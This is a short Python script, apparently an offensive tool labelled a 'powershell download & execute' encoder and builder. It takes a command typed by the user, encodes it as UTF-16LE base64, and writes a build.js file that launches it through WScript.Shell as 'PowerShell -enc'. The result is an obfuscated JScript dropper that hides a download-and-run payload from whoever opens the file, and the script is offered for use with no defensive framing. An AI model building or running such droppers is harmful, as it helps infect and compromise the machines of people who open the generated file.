import base64

print('## powershell download & execute , Encoder + Builder        ##')
print('## Note: This is not a normal base64 encoder!               ##')
print('## It converts the string to UTF-16LE first before encoding ##')
print('## as that is what PowerShell expects!                      ##')
print('')

file=open('build.js','w')

code = raw_input('INVOKEN STRING TO ENCODE: ')
print('')
shellcode = base64.b64encode(code.encode('UTF-16-LE'))
print (shellcode)
print('')
file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('PowerShell -enc " + shellcode + "');")
file.close()
print('[+] String Encoded.')
print('[+] Build Saved.')
print('')
raw_input('PRESS ANY KEY TO CONTINIUE')
